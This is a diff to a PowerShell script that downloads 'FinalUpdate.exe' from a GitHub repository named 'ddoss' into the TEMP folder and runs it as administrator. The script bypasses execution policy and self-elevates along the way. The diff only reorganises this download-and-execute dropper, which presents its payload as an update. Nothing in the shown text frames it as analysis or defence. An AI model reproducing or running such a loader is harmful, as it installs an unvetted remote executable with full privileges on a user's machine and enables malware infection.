@@ -1,8 +1,9 @@
 $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe"
 $p = "$env:TEMP\FinalUpdate.exe"
+
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"& { (New-Object Net.WebClient).DownloadFile('$u', '$p'); Start-Process '$p' -Verb RunAs }`"" -Verb RunAs
-    exit
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"(New-Object Net.WebClient).DownloadFile('$u', '$p'); Start-Process '$p' -Verb RunAs`"" -Verb RunAs
+} else {
+    (New-Object Net.WebClient).DownloadFile($u, $p)
+    Start-Process $p -Verb RunAs
 }
-(New-Object Net.WebClient).DownloadFile($u, $p)
-Start-Process $p -Verb RunAs
